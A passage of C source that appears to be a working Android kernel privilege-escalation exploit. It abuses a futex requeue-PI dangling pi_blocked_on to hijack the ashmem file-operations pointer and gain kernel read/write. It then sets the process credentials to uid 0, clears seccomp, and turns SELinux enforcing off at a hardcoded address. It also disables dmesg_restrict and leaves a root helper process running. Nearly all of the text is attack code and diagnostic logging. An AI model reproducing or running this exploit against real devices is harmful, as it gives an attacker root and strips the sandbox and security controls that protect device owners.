		fail = 1;
	if (t37_kwrite_data(fd, task + 0x840, "\0\0\0\0\0\0\0\0", 8) != 8) /* filter */
		fail = 1;
	{
		uint64_t v = t37_kread64(fd, task + 0x838);
		uint32_t mode;
		memcpy(&mode, &v, 4);
		if (mode != 0 || fail) {
			LOGI("[t37] root: seccomp verify FAIL (mode=%u fail=%d)",
			     mode, fail);
			return -1;
		}
	}
	LOGI("[t37] root: seccomp cleared (mode/count/filter=0, TIF bit11 off, "
	     "PFA bit0 off)");
	return 0;
}

/* ---- main Tier-3 orchestration (runs in consumer thread, inside the
 * blocking window; victim sendmsg must still be pending).
 * r23 order (KE13/16/17 lessons — window safety is structural, not timed):
 *   open alias → CALIBRATE the plant channel (read the marker page itself,
 *   content-known) → NULL-TABLE RESTORE ([TARGET] = page+0xF00, an all-zero
 *   fops table in OUR page: other processes' ashmem ops all fail -EINVAL —
 *   window SAFE forever; our fd keeps its open-time f_op binding = fake_fops
 *   so the primitive survives) → [TARGET] readback (expect null-table ptr,
 *   confirms [11a] + restore) → task walk from init_task (PROVEN mapped:
 *   setprio early-exit ×5 boots) → cred/seccomp/selinux → teardown → uid0. ---- */
/* (T37_SCRATCH_OFF/T37_NULL_TABLE_OFF now defined above the plant-guard) */

static void t37_root_chain(void)
{
	int consumer_tid = g_consumer_tid;
	uint64_t target = g_slide + GL36_ASHMEM_MISC_STATIC + 0x10;
	uint64_t fake_fops_va = g_page_base + GL36_FAKE_FOPS_OFF;
	uint64_t null_table = g_page_base + T37_NULL_TABLE_OFF;
	uint64_t calib_expect;   /* r24: taken from g_page_map at runtime — the
	                          * fill's memset zeroes the "37ST" setup marker,
	                          * so [page_base+0..8] = whatever t37_page holds
	                          * NOW (r23 hardcoded the stale setup value and
	                          * FATALed on a CORRECT readback of 0x0) */
	uint64_t val;
	const char *wtest = "T3BINWOK";
	char wbuf[16];

	memcpy(&calib_expect, g_page_map, 8);

	/* 1. open hijack window (misc->fops == fake_fops now) */
	LOGI("[t37] root: r34 zero-free plant ACTIVE (1-SET_NAME page plants, "
	     "tail-offset compensation, gate + sentinel + seq canary + "
	     "readback-closed writes, retries<=%d)", T37_PLANT_RETRIES);
	g_root_fd = t37_open_ashmem_alias();
	if (g_root_fd < 0) {
		LOGI("[t37] root: FATAL no ashmem alias openable — no primitive, "
		     "stop (MISC WINDOW REMAINS OPEN — REBOOT REQUIRED)");
		return;
	}
	/* 2. CALIBRATE the plant channel with a content-known, guaranteed-
	 * mapped address: the marker page itself (physmap domain). r34: the
	 * hardened kread (gate + sentinel + retries ≤3) now costs TWO
	 * SET_NAMEs — three consecutive gate failures mean the SET_NAME
	 * channel is broken, not noise. */
	{
		int cal_ok = 0, cal_try;

		for (cal_try = 1; cal_try <= T37_PLANT_RETRIES && !cal_ok;
		     cal_try++) {
			errno = 0;
			val = 0;
			if (t37_kread_data(g_root_fd, g_page_base, &val, 8) != 8)
				continue;
			cal_ok = (val == calib_expect);
			LOGI("[t37] root: calib readback try %d = %s (expect %s "
			     "= marker head) — %s", cal_try, u64hex(val),
			     u64hex(calib_expect),
			     cal_ok ? "OK (channel EXACT)" : "MISMATCH");
		}
		if (!cal_ok) {
			/* 38-r37: window-leak-safe FATAL (r36 lesson: a plain
			 * return here left [TARGET] = fake_fops pointing at a
			 * page freed with our process — any later ashmem open
			 * dereferences a dangling fops table). Order: try the
			 * null-restore write ([TARGET] = in-page zero table);
			 * if even that fails, fork the pin child (mlocks the
			 * marker page) and PARK this process forever — the
			 * page stays alive, the window stays harmless, and a
			 * later `adb reboot` is the only cleanup needed. */
			uint64_t wt2 = null_table;

			LOGI("[t37] root: FATAL calib FAIL after %d tries — "
			     "window-leak-safe shutdown", T37_PLANT_RETRIES);
			if (t37_kwrite_data(g_root_fd, target, &wt2, 8) == 8)
				LOGI("[t37] root: window null-restore LANDED "
				     "([TARGET] = in-page zero table) — safe");
			else {
				pid_t pin = fork();

				if (pin == 0) {
					(void)prctl(PR_SET_NAME, "t37pin", 0,
						    0, 0);
					if (g_page_fd >= 0)
						fcntl(g_page_fd, F_SETFD, 0);
					mlock(g_page_map, 4096);
					for (;;)
						pause();
					_exit(0);
				}
				LOGI("[t37] root: null-restore FAILED — window "
				     "PENDING with page pinned (pin pid=%d); "
				     "REBOOT REQUIRED, probe parked", pin);
				for (;;)
					pause();
			}
			return;
		}
	}
	/* 3. [TARGET] readback (plant page=TARGET): expect fake_fops = the
	 * [11a] hijack value. r26/r33: NO FATAL past the calib — hardened
	 * read (gate + sentinel + retries), failure = log-and-continue (the
	 * mission chain does not depend on the misc slot). */
	errno = 0;
	val = 0;
	if (t37_kread_data(g_root_fd, target, &val, 8) != 8) {
		LOGI("[t37] root: [TARGET] readback FAIL (errno=%d) — continuing",
		     errno);
		goto chain;
	}
	LOGI("[t37] root: [TARGET] = %s (expect fake_fops %s) — %s",
	     u64hex(val), u64hex(fake_fops_va),
	     val == fake_fops_va ? "OK ([11a] confirmed)" : "MISMATCH");
	/* 4. scratch binwrite test (physmap dst — in-page): separates "write
	 * primitive works" from "[TARGET] (image .data dst) specifics". */
	if (t37_kwrite_data(g_root_fd, g_page_base + T37_SCRATCH_OFF,
			    wtest, 8) != 8) {
		LOGI("[t37] root: binwrite scratch FAIL (errno=%d)", errno);
	} else if (t37_kread_data(g_root_fd, g_page_base + T37_SCRATCH_OFF,
				  wbuf, 8) != 8 || memcmp(wbuf, wtest, 8)) {
		LOGI("[t37] root: scratch readback MISMATCH (got '%.8s')",
		     wbuf[0] ? wbuf : "<nul>");
	} else {
		LOGI("[t37] root: scratch binwrite+readback OK — write primitive "
		     "WORKS (physmap dst)");
	}
	/* 5. null-restore attempt on [TARGET] + verify (diagnostic — if the
	 * write primitive only fails on image-.data dsts this isolates it).
	 * r33: kwrite is readback-closed internally; the extra kread here is
	 * an independent double-check of the restored slot. */
	{
		uint64_t wt2 = null_table;

		if (t37_kwrite_data(g_root_fd, target, &wt2, 8) != 8) {
			LOGI("[t37] root: null-restore pwrite FAIL errno=%d", errno);
		} else if (t37_kread_data(g_root_fd, target, &val, 8) != 8) {
			LOGI("[t37] root: null-restore verify read FAIL");
		} else {
			LOGI("[t37] root: null-restore verify: [TARGET] = %s "
			     "(want %s) — %s", u64hex(val), u64hex(null_table),
			     val == null_table ? "RESTORED (window safe)" :
			     "NOT LANDED (write no-op on image dst)");
		}
	}
chain:
	/* 41-r123: TEARDOWN + WALK-ONLY GATE (placed after the write primitive
	 * is live, before any privilege action). TEARDOWN clears the victim
	 * waiter thread's dangling pi_blocked_on (task+0x880) while it spins
	 * in user space (zero kernel concurrency on that field), then
	 * verifies — zeroes the UAF-inherent residency that r122 tied to the
	 * walk-only panics and (per r120-r121) the root-state blob crash.
	 * WALK-ONLY (stop-before-root) then exits before cred/seccomp/
	 * enforcing/parked-pin so the residency is testable in isolation. */
	if (access("/data/local/tmp/t37-teardown", F_OK) == 0) {
		uint64_t vt = t37_find_task_by_pid_in_group(g_root_fd,
			g_consumer_task, victim_tid);

		if (vt) {
			uint64_t pbo = t37_kread64(g_root_fd,
				vt + GL36_TASK_PI_BLOCKED_ON_OFF);

			LOGI("[t37] root: teardown: victim tid=%d task=%s "
			     "pi_blocked_on=%s", victim_tid, u64hex(vt),
			     u64hex(pbo));
			if (!pbo) {
				LOGI("[t37] root: teardown: pi_blocked_on "
				     "already 0 (nothing to clear)");
			} else if (t37_kwrite64(g_root_fd,
						vt + GL36_TASK_PI_BLOCKED_ON_OFF,
						0) == 0 &&
				   t37_kread64(g_root_fd,
					vt + GL36_TASK_PI_BLOCKED_ON_OFF) == 0) {
				LOGI("[t37] root: teardown: pi_blocked_on "
				     "cleared + verified <<< RESIDENCY ZEROED");
			} else {
				LOGI("[t37] root: teardown: clear FAIL "
				     "(residency kept)");
			}
		} else {
			LOGI("[t37] root: teardown: victim task walk FAIL "
			     "(tid=%d)", victim_tid);
		}
	}
	if (access("/data/local/tmp/t37-stop-before-root", F_OK) == 0) {
		LOGI("[t37] root: STOP-FLAG t37-stop-before-root seen — "
		     "walk done, privilege chain NOT run (walk-only state)");
		return;
	}
	/* 6. llseek slot repair (in-page [11a] collateral): user-space memcpy
	 * onto the memfd page == physmap view (same physical page) */
	{
		uint64_t noop = gl36_rt_slide + GL36_JT_NOOP_LLSEEK; /* full VA */
		if (g_page_map) {
			memcpy(g_page_map + GL36_FAKE_FOPS_OFF + 0x08, &noop, 8);
			memcpy(&val, g_page_map + GL36_FAKE_FOPS_OFF + 0x08, 8);
			LOGI("[t37] root: llseek slot repaired = %s", u64hex(val));
		}
	}
	/* 7. privilege chain: consumer task (this thread) */
	g_consumer_task = t37_find_task_by_comm(g_root_fd, g_walk_comm);
	if (!g_consumer_task) {
		LOGI("[t37] root: FATAL leader task not found (comm walk)");
		return;
	}
	LOGI("[t37] root: leader task = %s (tid=%d) — cred/seccomp/selinux "
	     "patch the leader; uid proof runs on the leader after join",
	     u64hex(g_consumer_task), consumer_tid);
	if (t37_patch_cred(g_root_fd, g_consumer_task) != 0)
		LOGI("[t37] root: cred patch FAILED (continuing to teardown)");
	if (t37_patch_seccomp(g_root_fd, g_consumer_task) != 0)
		LOGI("[t37] root: seccomp clear FAILED");
	/* 38-r40: selinux enforcing -> 0, RESTORED with a verified address.
	 * research/38-selinux-state-offset.md: selinux_state linked VA =
	 * 0xFFFFFF800AB47D90 (cross-checked in selinux_init AND
	 * sel_write_enforce disasm), enforcing = bool @ +0x1 (strb w9,[x20,#1]
	 * in enforcing_setup). The old hardnote's +0x20 landed OUTSIDE the
	 * struct on selinux_enforcing_boot (r38 KE). Runtime addr = full
	 * linked VA + slide. Triple check before writing: avc/ss pointers
	 * look like kernel VAs and initialized@+3 == 1; then ONE byte write. */
	{
		uint64_t se_va = 0xFFFFFF800AB47D90ULL;   /* linked-time VA */
		uint64_t se_addr = gl36_rt_slide + se_va; /* runtime */
		uint64_t q0 = 0, qavc = 0, qss = 0;
		uint8_t initialized = 0, enforcing = 0xff;

		if (t37_kread_data(g_root_fd, se_addr, &q0, 8) == 8) {
			memcpy(&initialized, (uint8_t *)&q0 + 3, 1);
			memcpy(&enforcing, (uint8_t *)&q0 + 1, 1);
			LOGI("[t37] root: selinux_state@%s q0=%s enforcing=%u "
			     "initialized=%u", u64hex(se_addr), u64hex(q0),
			     enforcing, initialized);
		} else {
			LOGI("[t37] root: selinux_state q0 read FAIL — skip "
			     "enforce write");
			goto selinux_done;
		}
		if (t37_kread_data(g_root_fd, se_addr + 0x10, &qavc, 8) != 8 ||
		    t37_kread_data(g_root_fd, se_addr + 0x18, &qss, 8) != 8) {
			LOGI("[t37] root: selinux_state avc/ss read FAIL — "
			     "struct mismatch, skip enforce write");
			goto selinux_done;
		}
		if ((qavc >> 48) != 0xFFFF || (qss >> 48) != 0xFFFF ||
		    initialized != 1) {
			LOGI("[t37] root: selinux_state TRIPLE-CHECK FAIL "
			     "(avc=%s ss=%s init=%u) — address wrong, skip",
			     u64hex(qavc), u64hex(qss), initialized);
			goto selinux_done;
		}
		/* single-BYTE write: enforcing@+1 only (4 bytes would clobber
		 * checkreqprot@+2) */
		if (t37_kwrite_data(g_root_fd, se_addr + 1, "\0", 1) == 1 &&
		    t37_kread_data(g_root_fd, se_addr, &q0, 8) == 8 &&
		    (uint8_t)((q0 >> 8) & 0xff) == 0) {
			LOGI("[t37] root: selinux enforcing 1 -> 0 OK "
			     "(single-byte write verified)");
		} else {
			LOGI("[t37] root: selinux enforce write/verify FAIL "
			     "(module load may stay EPERM)");
		}
	}
selinux_done:;
	/* 8. victim task teardown (dangling pi_blocked_on) */
	/* r28: the victim (waiter thread) is NOT in the tasks list (thread,
	 * not a group leader) and parks in a pure user spin after its sendmsg
	 * returns — zero syscalls — the dangling pi_blocked_on is never
	 * dereferenced this run; teardown deferred to the final exploit. */
	/* 41-r123: TEARDOWN ON — with the flag, clear the victim waiter
	 * thread's dangling pi_blocked_on (task+0x880) while it spins in
	 * user space (zero kernel concurrency on that field), then verify.
	 * This zeroes the UAF-inherent residency that r122 tied to both the
	 * blob crash (root-state exit) and the walk-only panics. The forged
	 * W stays parked on the FAKE lock's tree — no real lock ever walks
	 * it — and the page-pin child still holds the marker page alive. */
	if (access("/data/local/tmp/t37-teardown", F_OK) == 0) {
		uint64_t vt = t37_find_task_by_pid_in_group(g_root_fd,
			g_consumer_task, victim_tid);

		if (vt) {
			uint64_t pbo = t37_kread64(g_root_fd,
				vt + GL36_TASK_PI_BLOCKED_ON_OFF);

			LOGI("[t37] root: teardown: victim tid=%d task=%s "
			     "pi_blocked_on=%s", victim_tid, u64hex(vt),
			     u64hex(pbo));
			if (!pbo) {
				LOGI("[t37] root: teardown: pi_blocked_on "
				     "already 0 (nothing to clear)");
			} else if (t37_kwrite64(g_root_fd,
						vt + GL36_TASK_PI_BLOCKED_ON_OFF,
						0) == 0 &&
				   t37_kread64(g_root_fd,
					vt + GL36_TASK_PI_BLOCKED_ON_OFF) == 0) {
				LOGI("[t37] root: teardown: pi_blocked_on "
				     "cleared + verified <<< RESIDENCY ZEROED");
			} else {
				LOGI("[t37] root: teardown: clear FAIL "
				     "(residency kept)");
			}
		} else {
			LOGI("[t37] root: teardown: victim task walk FAIL "
			     "(tid=%d)", victim_tid);
		}
	}
	LOGI("[t37] root: victim parked in user spin (no syscall) — dangling "
	     "pi_blocked_on never deref'd; teardown deferred");
	/* 9. leader cred readback (the syscall-level proof runs on the LEADER
	 * thread in run_child after the join — this thread's own cred is
	 * untouched). */
	{
		uint64_t cred_now = t37_kread64(g_root_fd,
			g_consumer_task + GL36_TASK_CRED_OFF);
		uint64_t uidq = t37_kread64(g_root_fd, cred_now);
		LOGI("[t37] root: leader cred=%s uid/gid quad = %s — %s",
		     u64hex(cred_now), u64hex(uidq),
		     (uidq & 0xFFFFFFFF) == 0 ? "uid=0 SET (kernel view)" :
		     "uid != 0 — patch incomplete");
	}
	/* 41-r123 ashmem TRUE-RESTORE: [TARGET] (ashmem misc->fops) has been
	 * fake_fops since [11a] fired, then null_table after the restore —
	 * BOTH are marker-page tables, so every /dev/ashmem open after the
	 * walk gets a poisoned f_op and every blob (CursorWindow/Bitmap
	 * nativeWriteToParcel) dies with ENOTTY-family errors (r103-r120
	 * crash stacks all route through nativeWriteToParcel). The REAL
	 * ashmem_fops is a const .rodata structure invisible to kallsyms
	 * (KALLSYMS_ALL=n); recovered offline from boot.img's .rela.dyn.
	 *
	 * 41-r142 CORRECTION (boot31+boot32 double scene, misc_open ->
	 * try_module_get write-to-RO panic on first post-restore ashmem
	 * open): the r123 value 0xffffff80094ccf58 was WRONG — it sits in
	 * a dense direct-pointer cluster (all ashmem.c fns in addr order,
	 * incl. shrinker slots) whose slot-0 receives &ashmem_shrink_scan
	 * via rela; file_operations is __randomize_layout here, so the
	 * "llseek@+0x08" anchor math was invalid. Ground truth = the
	 * kernel's own rela for ashmem_misc (minor=0xff, name="ashmem" @
	 * 0xffffff800a6bd450): its fops slot @0xffffff800a6bd460 is filled
	 * with 0xffffff8009a2e6f0 — the CFI jt table whose 7 filled slots
	 * decode (B imm26) to exactly {llseek, read_iter, ioctl,
	 * compat_ioctl, mmap, open, release}; owner slot stays NULL
	 * (THIS_MODULE, built-in) so try_module_get is a no-op. Under
	 * CFI a live fops MUST hold jt thunks — the direct-pointer cluster
	 * could never have been a live fops. Restore writes the TRUE
	 * pointer, not another marker-page table. */
	{
		uint64_t ash_fops = g_slide + 0xFFFFFF8009A2E6F0ULL;
		uint64_t cur = t37_kread64(g_root_fd, target);

		if (ash_fops) {
			LOGI("[t37] root: ashmem true-restore: [TARGET] %s -> ashmem_fops %s",
			     u64hex(cur), u64hex(ash_fops));
			if (t37_kwrite64(g_root_fd, target, ash_fops) == 0 &&
			    t37_kread64(g_root_fd, target) == ash_fops)
				LOGI("[t37] root: ashmem fops TRUE-RESTORED "
				     "<<< ASHMEM LIVE AGAIN");
			else
				LOGI("[t37] root: ashmem true-restore write/verify FAIL");
		} else {
			LOGI("[t37] root: ashmem true-restore: kallsyms miss "
			     "(fops stays null_table)");
		}
	}
	/* 41-r123: open dmesg to adb (root+caps context) — the offprobe
	 * calibrator's pr_alert offsets land in the kernel ring, readable
	 * from the host once dmesg_restrict is off. Best-effort. */
	{
		int df = open("/proc/sys/kernel/dmesg_restrict", O_WRONLY);

		if (df >= 0) {
			ssize_t w = write(df, "0", 1);

			LOGI("[t37] root: dmesg_restrict -> 0 (%zd)", w);
			close(df);
		}
	}
	/* 41-r128: pstore FULL dump HERE — earliest root+caps window. The
	 * PREVIOUS boot's panic console survives in console-ramoops until
	 * the next panic; r128's panic (probe died mid-round) never reached
	 * the main-tail dump, so the read must run inside the root chain. */
	{
		int pf = open("/sys/fs/pstore/console-ramoops", O_RDONLY);

		if (pf >= 0) {
			int of = open("/data/local/tmp/pstore_dump.txt",
				      O_WRONLY | O_CREAT | O_TRUNC, 0644);
			char pbuf[8192];
			ssize_t r;
			long total = 0;

			if (of >= 0) {
				while ((r = read(pf, pbuf, sizeof(pbuf))) > 0) {
					ssize_t w = write(of, pbuf, r);

					if (w != r)
						break;
					total += w;
				}
				fsync(of);
				close(of);
				LOGI("[t37] root: pstore FULL dump -> "
				     "pstore_dump.txt (%ld bytes, fsynced)", total);
			} else {
				LOGI("[t37] root: pstore dump open-out FAIL "
				     "errno=%d", errno);
			}
			close(pf);
		} else {
			LOGI("[t37] root: pstore console-ramoops open FAIL "
			     "errno=%d", errno);
		}
	}
	/* r27: page-pin child — the null-table restore points [TARGET] at the
	 * marker page; without a holder the memfd dies with this process and
	 * [TARGET] becomes a freed page (KE hazard for later ashmem users).
	 * An orphaned child keeps g_page_fd open + mlocked until reboot. */
	{
		pid_t pin = fork();

		if (pin == 0) {
			/* 41-r128b: the pin child is ROOT and SURVIVES the
			 * probe (and a probe-killing panic — it is parked in
			 * user space). Sleep 60s (past the panic-prone appinfo
			 * window), then dump the CURRENT boot's pstore ring —
			 * which by then holds the PREVIOUS panic's console if
			 * this boot followed a panic. Decouples pstore capture
			 * from probe survival entirely. */
			(void)prctl(PR_SET_NAME, "t37pin", 0, 0, 0);
			sleep(60);
			{
				int pf = open("/sys/fs/pstore/console-ramoops",
					      O_RDONLY);
				char dn[64];

				snprintf(dn, sizeof(dn),
					 "/data/local/tmp/pstore_dump_%d.txt",
					 (int)getpid());
				if (pf >= 0) {
					int of = open(dn, O_WRONLY | O_CREAT |
							   O_TRUNC, 0644);
					char pbuf[8192];
					ssize_t r;
					long total = 0;

					if (of >= 0) {
						while ((r = read(pf, pbuf,
								 sizeof(pbuf))) > 0) {
							ssize_t w = write(of, pbuf, r);

							if (w != r)
								break;
							total += w;
						}
						fsync(of);
						close(of);
						LOGI("[t37pin] pstore FULL dump "
						     "-> %s (%ld bytes, fsynced)", dn,
						     total);
					}
					close(pf);
				}
			}
			if (g_page_fd >= 0)
				fcntl(g_page_fd, F_SETFD, 0);
			mlock(g_page_map, 4096);
			for (;;)
				pause();
			_exit(0);
		}
		if (pin > 0)
			LOGI("[t37] root: page-pin child pid=%d (holds null "
			     "table page alive; pstore dump @+60s)", pin);
	}
}

static void *consumer_thread(void *arg)
{
	struct sched_attr {
		uint32_t size;
		uint32_t policy;
		uint64_t flags;
		int32_t nice;
		uint32_t priority;
		uint64_t runtime;
		uint64_t deadline;
		uint64_t period;
		uint32_t util_min;
		uint32_t util_max;
	} attr;
	long ret;

	(void)arg;
	t37_pin_cpu(0);
	prctl(PR_SET_NAME, g_walk_comm, 0, 0, 0);    /* r42: unique walk comm */
	g_consumer_tid = (int)syscall(SYS_gettid);
	memset(&attr, 0, sizeof(attr));
	attr.size = sizeof(attr);
	attr.policy = 3;      /* SCHED_BATCH: real policy change, no no-op short-circuit */
	attr.nice = 0;        /* min invariant: prio stays min(120, booster) */

	while (!consumed) {
		if (!__atomic_load_n(&stamp_sent, __ATOMIC_ACQUIRE) || !victim_tid) {
			volatile int spin = 0;
			(void)spin;
			continue;
		}
		if (!__atomic_load_n(&g_sm2_slept, __ATOMIC_ACQUIRE)) {
			struct timespec ts = { 0, 100 * 1000 * 1000 };
			nanosleep(&ts, NULL);
			__atomic_store_n(&g_sm2_slept, 1, __ATOMIC_RELEASE);
			LOGI("R%d [consumer] stamp_sent observed + 100ms (copy landed) — "
			     "begin judgement", g_round_no);
		}
		/* still-blocking assertion (r7 lesson: queue not full -> ret produced
		 * early -> residual band -> tree_entry dead) */
		{
			long sm_ret = __atomic_load_n(&g_sm_ret, __ATOMIC_ACQUIRE);
			if (sm_ret != 0)
				LOGI("R%d [consumer] BLOCK-ANOMALY: victim sendmsg already "
				     "returned (ret=%ld) before drain — blocking precondition "
				     "FAILED, degrade verdict (non-destructive)",
				     g_round_no, sm_ret);
			else
				LOGI("R%d [consumer] victim sendmsg still blocking (g_sm_ret=0) — "
				     "blocking precondition verified OK", g_round_no);
		}
		t37_readback_selfcheck();
		/* poison prio is 3 (canary): real prio must differ, else chain will
		 * not enter (COLLIDE guard) */
		{
			char path[64], buf[2048], *p;
			FILE *fp;
			int i, v;

			snprintf(path, sizeof(path), "/proc/self/task/%d/stat", victim_tid);
			fp = fopen(path, "r");
			if (fp) {
				if (fgets(buf, sizeof(buf), fp)) {
					p = strrchr(buf, ')');
					if (p) {
						p++;
						for (i = 0; i < 15; i++) {
							while (*p == ' ') p++;
							while (*p && *p != ' ') p++;
						}
						while (*p == ' ') p++;
						v = (int)strtol(p, NULL, 10);
						if (v < 0 || v > 39)
							v = -1;
						LOGI("R%d [consumer] victim real prio=%d (expect 120; "
						     "poison prio=%d must differ — chain entry precondition)",
						     g_round_no, v < 0 ? -1 : v + 100, T37_POISON_PRIO);
						g_victim_prio = v < 0 ? -1 : v + 100;
					}
				}
				fclose(fp);
			}
		}
		/* COLLIDE / CALIB gate: poison prio 3 must differ from victim real
		 * prio (chain entry precondition); unreadable prio = abort round. */
		if (g_victim_prio < 0 || g_victim_prio == T37_POISON_PRIO) {
			LOGI("R%d [consumer] PRE-CONSUME %s: victim prio=%d poison=%d — "
			     "abandon consume (non-destructive)", g_round_no,
			     g_victim_prio < 0 ? "CALIB-FAIL" : "COLLIDE",
			     g_victim_prio, T37_POISON_PRIO);
			for (;;) {
				volatile int spin = 0;
				(void)spin;
			}
		}
		/* CONSUME: sched_setattr(victim, SCHED_BATCH, nice 0) ->
		 * rt_mutex_adjust_pi reads dangling pi_blocked_on = W;
		 * waiter_equal(3, 120) false -> chain walk [1]..[12] (canary form:
		 * prio=3 != 120). Expected: ret=0, no KE, all writes argued in §2. */
		errno = 0;
		ret = syscall(SYS_sched_setattr, victim_tid, &attr, 0);
		LOGI("R%d [consumer] sched_setattr(tid=%d, SCHED_BATCH, nice=0) ret=%ld "
		     "errno=%d(%s) <<<< CONSUME POINT (canary: prio=3 chain walk, "
		     "expect ret=0 + no KE + [11a] off-page write skipped)",
		     g_round_no, victim_tid, ret, errno, errno_name(errno));
		if (ret == 0) {
			long g1 = syscall(SYS_getpriority, PRIO_PROCESS, victim_tid);
			long pol = syscall(SYS_sched_getscheduler, victim_tid);
			LOGI("R%d [consumer] getpriority-after=%ld (expect 20 = nice0 kept) "
			     "sched_getscheduler=%ld (expect 3 = SCHED_BATCH, consume real) "
			     "prio-invariant-ok", g_round_no, g1, pol);
		}
		consumed = 1;
		if (g_mode_root) {
			/* 37-r17: the walk already fired [11a] ([TARGET]=fake_fops).
			 * Everything below runs inside the blocking window —
			 * victim sendmsg must still be blocking until teardown. */
			t37_root_chain();
		}
	}
	return NULL;
}

/* ============================================================================
 * Per-round child process (formation identical to 29-r7 minus atoms shaping:
 * the pseudo-world now lives in the marker page, no mali/kctx dependency).
 * ============================================================================
 */
static int g_done_fd = -1;

/* 37-r16: re-arm the pseudo-world. KE12 proved the round-N kernel-side
 * paths (rt_mutex dequeue/enqueue run by the REAL unblock code against
 * fake_lock/fake_task/W0) leave the shared memfd page mutated across
 * rounds — R2's walk found fake_lock.waiters.rb_leftmost holding a dead
 * kernel-stack waiter pointer (vmalloc 0xffffff802186bd30, = R1 victim
 * stack waiter form) and died in rt_mutex_top_waiter's BUG_ON reading
 * [garbage+56] (chain+0x148/0x14c). Refill + verify before EVERY round so
 * each walk starts from the designed topology. */
static void t37_rearm_pseudo_world(void)
{
	gl36_rt_slide = g_slide;   /* 37-r7: runtime slide into every fops slot */
	t37_fill_pseudo_page(t37_page);
	if (g_page_map)
		memcpy(g_page_map, t37_page, 4096);
	/* 37-r14: VERIFY the write-back actually landed in the kernel page.
	 * Read back through a FRESH mmap (bypass our own mapping) and compare;
	 * fall back to pwrite+msync. */
	{
		uint8_t *chk = mmap(NULL, 4096, PROT_READ, MAP_SHARED, g_page_fd, 0);
		if (chk != MAP_FAILED) {
			if (memcmp(chk, t37_page, 4096) != 0) {
				LOGI("[t37] pseudo-page READBACK MISMATCH (map) — retrying pwrite");
				if (pwrite(g_page_fd, t37_page, 4096, 0) != 4096)
					DIE_IF(1, "pseudo-page pwrite retry");
			}
			munmap(chk, 4096);
		}
		/* decisive single-slot checks (KE9 + KE12 signatures):
		 * [W0.pi.pc] must be fake_fops (RED, bit0=0);
		 * fake_lock.waiters.{root,leftmost} must be &W0.tree_entry. */
		{
			uint8_t *v = mmap(NULL, 4096, PROT_READ, MAP_SHARED, g_page_fd, 0);
			if (v != MAP_FAILED) {
				uint64_t pc = *(uint64_t *)(v + GL36_W0_OFF +
							   GL36_WAITER_PI_PC_OFF);
				uint64_t lr_ = *(uint64_t *)(v + GL36_FAKE_LOCK_OFF + 0x08);
				uint64_t lm = *(uint64_t *)(v + GL36_FAKE_LOCK_OFF + 0x10);
				uint64_t expect_tree = g_w0 + GL36_WAITER_TREE_PC_OFF;
				LOGI("[t37] rearm: W0.pi.pc=%s (expect %s) fl.root=%s "
				     "fl.leftmost=%s (expect %s)",
				     u64hex(pc), u64hex(g_fake_fops), u64hex(lr_),
				     u64hex(lm), u64hex(expect_tree));
				DIE_IF(pc != g_fake_fops, "W0.pi.pc not RED in page");
				DIE_IF(lr_ != expect_tree || lm != expect_tree,
				       "fake_lock.waiters not W0-rooted (KE12 residue)");
				if (g_mode_root) {
					/* 37-r17 decisive: rb_right must be TARGET
					 * (misc->fops slot canonical+slide) */
					uint64_t pr = *(uint64_t *)(v + GL36_W0_OFF +
								   GL36_WAITER_PI_RIGHT_OFF);
					uint64_t target = g_slide + GL36_ASHMEM_MISC_STATIC + 0x10;
					LOGI("[t37] rearm: W0.pi.rb_right=%s (TARGET=%s)",
					     u64hex(pr), u64hex(target));
					DIE_IF(pr != target, "rb_right != TARGET (root arm)");
				}
				munmap(v, 4096);
			}
		}
	}
	LOGI("[t37] pseudo-world re-armed (MAP_SHARED in-place, readback verified)");
}

static int run_child(int round)
{
	pthread_t th;
	pthread_attr_t attr;

	g_round_no = round;
	/* 38-r42: unique-per-run walk comm. The static "t37root" made a
	 * second run on the SAME boot walk into the PREVIOUS run's parked
	 * probe (r41: patch landed on the r40 zombie, getuid on the fresh
	 * process stayed 2000 — task/cred addresses were byte-identical to
	 * r40's). pid-suffix keeps the walk self-matching. */
	snprintf(g_walk_comm, sizeof(g_walk_comm), "t37r%04x",
		 (unsigned)(getpid() & 0xffff));
	prctl(PR_SET_NAME, g_walk_comm, 0, 0, 0);  /* r28: TG-leader comm (the
	                                            * tasks list only holds
	                                            * group leaders!) */
	f_wait = 0;
	f_pi_target = 0;
	f_pi_chain = 0;
	a_ready = a_waiting = b_started = deadlock_seen = 0;
	stamp_ready = consumed = 0;
	stamp_sent = 0;
	g_sm2_slept = 0;
	victim_tid = 0;

	/* 37-r16: re-arm the pseudo-world EVERY round (KE12: the previous
	 * round's kernel-side unblock paths mutate the shared memfd page —
	 * fake_lock.waiters.rb_leftmost carried a dead stack-waiter pointer
	 * into R2's walk -> top_waiter BUG_ON fault). The page must be in the
	 * designed topology before each walk. */
	t37_rearm_pseudo_world();

	DIE_IF(mlockall(MCL_CURRENT | MCL_FUTURE) != 0, "mlockall");

	DIE_IF(t37_sockets_setup() != 0, "t37 sockets");

	DIE_IF(pthread_attr_init(&attr) != 0, "pthread_attr_init");
	DIE_IF(pthread_attr_setstacksize(&attr, 1024 * 1024) != 0, "setstacksize");
	DIE_IF(pthread_create(&th, &attr, owner_thread, NULL) != 0, "pthread owner");
	if (!g_mode_deliver_only)   /* deliver mode: NO consumer thread at all */
		DIE_IF(pthread_create(&th, &attr, consumer_thread, NULL) != 0, "pthread consumer");
	if (g_mode_root)
		g_consumer_th = th;   /* r20: join before drain (KE19 lesson) */
	DIE_IF(pthread_create(&th, &attr, waiter_thread, NULL) != 0, "pthread waiter");

	while (!a_waiting || !b_started)
		usleep(1000);
	usleep(20000);

	if (write(g_done_fd, "r", 1) != 1)
		LOGI("R%d: pipe write 'r' failed", round);

	/* EDEADLK trigger: proxy requeue enqueues waiter's stack rt_waiter ->
	 * deadlock detection -> remove_waiter rollback leaves victim's
	 * pi_blocked_on DANGLING (the GhostLock binary residue). */
	errno = 0;
	{
		long ret = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
				    &f_pi_target, 0);
		LOGI("R%d [main] CMP_REQUEUE_PI ret=%ld errno=%d(%s) <<<< expect -EDEADLK",
		     round, ret, errno, errno_name(errno));
	}
	deadlock_seen = 1;
	futex_wake_int(&deadlock_seen);

	while (!consumed && !g_mode_deliver_only)
		usleep(1000);

	if (g_mode_deliver_only) {
		/* degraded form: NO consumer. Wait for the copy to land, then
		 * readback + drain. Chain walk never happens (owner is parked on
		 * LOCK_PI with no waker). */
		int waited = 0;
		while (!__atomic_load_n(&stamp_sent, __ATOMIC_ACQUIRE) && waited < 10000) {
			usleep(20 * 1000);
			waited += 20;
		}
